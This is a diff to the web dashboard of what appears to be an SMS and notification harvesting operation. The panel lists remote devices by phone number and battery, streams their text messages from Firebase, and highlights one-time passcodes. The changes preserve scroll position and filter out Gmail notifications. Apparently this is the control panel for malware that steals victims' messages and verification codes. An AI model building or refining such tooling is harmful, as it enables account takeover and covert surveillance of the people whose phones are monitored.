@@ -405,6 +405,8 @@
             overflow-y: auto;
             padding-right: 3px;
             margin-top: 6px;
+            /* Prevent scroll reset */
+            contain: layout style paint;
         }
 
         .inbox-messages::-webkit-scrollbar {
@@ -428,6 +430,8 @@
             margin-bottom: 4px;
             border-left: 2px solid rgba(79, 195, 247, 0.15);
             animation: slideIn 0.3s ease;
+            /* Prevent reflow */
+            contain: content;
         }
 
         .inbox-message .msg-header {
@@ -543,6 +547,11 @@
             display: inline-block;
         }
 
+        /* Hide Google/Gmail notifications */
+        .inbox-message.gmail-hidden {
+            display: none;
+        }
+
         @media (max-width: 768px) {
             body { padding: 8px; }
             .header { padding: 10px 14px; flex-direction: column; align-items: stretch; }
@@ -646,6 +655,9 @@
     let searchQuery = '';
     let isInitialLoad = true;
     let deviceListeners = {};
+    
+    // Track scroll position to prevent jumping
+    let scrollPosition = 0;
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -734,6 +746,16 @@
         return div.innerHTML;
     }
 
+    // ===== CHECK IF SHOULD HIDE GMAIL =====
+    function isGmailNotification(notif) {
+        if (!notif) return false;
+        // Check if app is com.google.android.gm
+        if (notif.app === 'com.google.android.gm') return true;
+        // Check if sender contains gmail or google
+        if (notif.sender && (notif.sender.toLowerCase().includes('gmail') || notif.sender.toLowerCase().includes('google'))) return true;
+        return false;
+    }
+
     // ===== RENDER FUNCTIONS =====
     function renderDevices() {
         const grid = document.getElementById('devicesGrid');
@@ -811,7 +833,6 @@
             grid.appendChild(card);
         });
 
-        // Auto-select first if none selected
         if (!selectedDeviceId && userIds.length > 0) {
             selectDevice(userIds[0]);
         }
@@ -821,7 +842,6 @@
         if (selectedDeviceId === deviceId) return;
         selectedDeviceId = deviceId;
         renderDevices();
-        // Force refresh inbox with latest data
         renderInbox();
         document.getElementById('newMsgDot').classList.remove('show');
     }
@@ -832,6 +852,9 @@
         const info = document.getElementById('selectedDeviceInfo');
         const totalCount = document.getElementById('smsTotalCount');
 
+        // Save scroll position before re-render
+        const currentScroll = container.scrollTop;
+
         if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
             container.innerHTML = '<div class="inbox-placeholder">👈 Select a device from the left</div>';
             info.textContent = 'Select a device to view messages';
@@ -839,12 +862,14 @@
             return;
         }
 
-        // Get the LATEST data directly from allUsers
         const user = allUsers[selectedDeviceId];
         const phone = getPhoneNumber(user) || 'No number';
         const battery = getBattery(user);
-        const smsList = getAllSms(user);
-        const notifList = getAllNotifications(user);
+        let smsList = getAllSms(user);
+        let notifList = getAllNotifications(user);
+
+        // FILTER: Hide Gmail notifications
+        notifList = notifList.filter(notif => !isGmailNotification(notif));
 
         info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
         totalCount.textContent = `${smsList.length + notifList.length} messages`;
@@ -854,11 +879,11 @@
             return;
         }
 
-        // If new message ID is provided and it's for the selected device
+        // If new message ID is provided, prepend it
         if (newMessageId) {
             const newSms = smsList.find(s => s.id === newMessageId);
             if (newSms) {
-                // Prepend the new message
+                // Check if it's NOT a Gmail notification
                 const div = document.createElement('div');
                 div.className = 'inbox-message new-message';
                 const sender = newSms.sender || 'Unknown';
@@ -880,41 +905,33 @@
                     <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
                 `;
                 
-                // Prepend and scroll to top
                 container.prepend(div);
                 container.scrollTop = 0;
-                
-                // Show notification dot
                 document.getElementById('newMsgDot').classList.add('show');
-                
-                // Update device card count
                 updateDeviceCardSmsCount(selectedDeviceId);
                 updateStats();
                 return;
             }
         }
 
-        // Full render (initial load or when selecting a device)
-        container.innerHTML = '';
+        // Full render - build HTML string for better performance
+        let html = '';
 
-        // Show notifications first
+        // Notifications (filtered - Gmail hidden)
         notifList.forEach(notif => {
-            const div = document.createElement('div');
-            div.className = 'inbox-message';
-            div.innerHTML = `
-                <div class="msg-header">
-                    <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
-                    <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
+            html += `
+                <div class="inbox-message">
+                    <div class="msg-header">
+                        <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
+                        <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
+                    </div>
+                    <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
                 </div>
-                <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
             `;
-            container.appendChild(div);
         });
 
-        // Then SMS
+        // SMS
         smsList.forEach(sms => {
-            const div = document.createElement('div');
-            div.className = 'inbox-message';
             const sender = sms.sender || 'Unknown';
             const isOTP = /otp|code|verification/i.test(sms.message);
             let bodyHtml = escapeHtml(sms.message || '');
@@ -926,17 +943,24 @@
                 }
             }
 
-            div.innerHTML = `
-                <div class="msg-header">
-                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
-                    <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
+            html += `
+                <div class="inbox-message">
+                    <div class="msg-header">
+                        <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                        <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
+                    </div>
+                    <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
                 </div>
-                <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
             `;
-            container.appendChild(div);
         });
 
-        container.scrollTop = 0;
+        // Update container without resetting scroll
+        container.innerHTML = html;
+        
+        // Restore scroll position if not at top
+        if (currentScroll > 0) {
+            container.scrollTop = currentScroll;
+        }
     }
 
     function updateDeviceCardSmsCount(deviceId) {
@@ -991,13 +1015,11 @@
     function setupFirebaseListeners() {
         const usersRef = database.ref('users');
 
-        // Listen for all user data changes
         usersRef.on('value', (snapshot) => {
             const data = snapshot.val();
             if (data) {
                 allUsers = data;
                 renderDevices();
-                // Only update inbox if we have a selected device
                 if (selectedDeviceId && allUsers[selectedDeviceId]) {
                     renderInbox();
                 }
@@ -1013,7 +1035,6 @@
             }
         });
 
-        // Listen for specific user changes
         usersRef.on('child_added', (snapshot) => {
             const key = snapshot.key;
             const data = snapshot.val();
@@ -1036,13 +1057,11 @@
                 renderDevices();
                 updateStats();
                 
-                // Check if this is the selected device
                 if (key === selectedDeviceId) {
                     const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
                     const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
                     
                     if (newSmsCount > oldSmsCount) {
-                        // Find new message
                         const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
                         const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
                         const newMsgId = newIds.find(id => !oldIds.includes(id));
